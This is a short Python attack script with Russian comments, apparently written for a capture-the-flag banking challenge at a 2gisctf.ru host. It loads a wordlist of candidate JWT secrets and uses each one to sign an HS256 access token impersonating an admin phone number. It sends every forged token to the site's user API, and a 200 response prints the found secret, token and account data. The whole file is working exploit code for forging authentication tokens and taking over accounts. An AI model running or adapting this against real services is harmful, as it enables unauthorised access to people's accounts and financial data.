import jwt
import requests
from datetime import datetime, timedelta

# Настройки
admin_phone = '+78005553535'
url = 'https://banking.2gisctf.ru/api/user'
wordlist_path = 'secrets.txt'

# Загружаем словарь
with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
    secrets = [line.strip() for line in f if line.strip()]

print(f'[+] Загружено {len(secrets)} возможных секретов')

# Перебор
for i, secret in enumerate(secrets, 1):
    try:
        payload = {
            'sub': admin_phone,
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(days=1),
            'type': 'access'
        }

        token = jwt.encode(payload, secret, algorithm='HS256')

        headers = {
            'Authorization': f'Bearer {token}'
        }

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            print('\n' + '='*40)
            print(f'[+] Найден секрет: {secret}')
            print(f'[+] Токен: {token}')
            print(f'[+] Ответ: {response.text}')
            print('='*40 + '\n')
            break
        else:
            print(f'[{i}] {secret} — не подошёл ({response.status_code})')

    except Exception as e:
        print(f'[{i}] Ошибка с секретом {secret}: {e}')